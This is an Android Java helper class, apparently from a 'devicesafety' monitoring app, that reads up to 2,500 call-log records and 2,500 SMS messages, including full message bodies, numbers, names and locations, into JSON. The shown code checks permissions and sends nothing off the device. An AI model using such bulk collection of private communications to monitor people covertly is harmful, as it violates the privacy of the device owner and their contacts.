package com.orphen.devicesafety;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

public final class CommunicationLogHelper {
    private static final int MAX_CALLS = 2500;
    private static final int MAX_SMS = 2500;

    private CommunicationLogHelper() {
    }

    public static boolean hasCallLogPermission(Context context) {
        return context.checkSelfPermission(Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasSmsPermission(Context context) {
        return context.checkSelfPermission(Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasCommunicationAccess(Context context) {
        return hasCallLogPermission(context) && hasSmsPermission(context);
    }

    public static JSONArray collectCallLog(Context context) {
        JSONArray items = new JSONArray();
        if (!hasCallLogPermission(context)) {
            return items;
        }
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                            CallLog.Calls._ID,
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION,
                            CallLog.Calls.DATE,
                            CallLog.Calls.COUNTRY_ISO,
                            CallLog.Calls.GEOCODED_LOCATION
                    },
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );
            if (cursor == null) {
                return items;
            }
            int added = 0;
            while (cursor.moveToNext() && added < MAX_CALLS) {
                JSONObject item = new JSONObject();
                item.put("sourceId", String.valueOf(cursor.getLong(0)));
                item.put("number", safeString(cursor, 1));
                item.put("name", safeString(cursor, 2));
                item.put("type", mapCallType(cursor.getInt(3)));
                item.put("duration", cursor.getLong(4));
                item.put("timestamp", cursor.getLong(5) / 1000L);
                item.put("countryIso", safeString(cursor, 6));
                item.put("location", safeString(cursor, 7));
                items.put(item);
                added++;
            }
        } catch (Exception ignored) {
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return items;
    }

    public static JSONArray collectSmsLog(Context context) {
        JSONArray items = new JSONArray();
        if (!hasSmsPermission(context)) {
            return items;
        }
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    new String[]{
                            Telephony.Sms._ID,
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.TYPE,
                            Telephony.Sms.DATE,
                            Telephony.Sms.READ,
                            Telephony.Sms.THREAD_ID,
                            Telephony.Sms.SUBJECT
                    },
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC"
            );
            if (cursor == null) {
                return items;
            }
            int added = 0;
            while (cursor.moveToNext() && added < MAX_SMS) {
                JSONObject item = new JSONObject();
                item.put("sourceId", String.valueOf(cursor.getLong(0)));
                item.put("address", safeString(cursor, 1));
                item.put("body", safeString(cursor, 2));
                item.put("type", mapSmsType(cursor.getInt(3)));
                item.put("timestamp", cursor.getLong(4) / 1000L);
                item.put("read", cursor.getInt(5) == 1 ? "read" : "unread");
                item.put("threadId", String.valueOf(cursor.getLong(6)));
                item.put("subject", safeString(cursor, 7));
                items.put(item);
                added++;
            }
        } catch (Exception ignored) {
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return items;
    }

    private static String safeString(Cursor cursor, int index) {
        String value = cursor.getString(index);
        return value == null ? "" : value;
    }

    private static String mapCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "blocked";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "voicemail";
            default:
                return "other";
        }
    }

    private static String mapSmsType(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "inbox";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "draft";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                return "outbox";
            default:
                return "other";
        }
    }
}
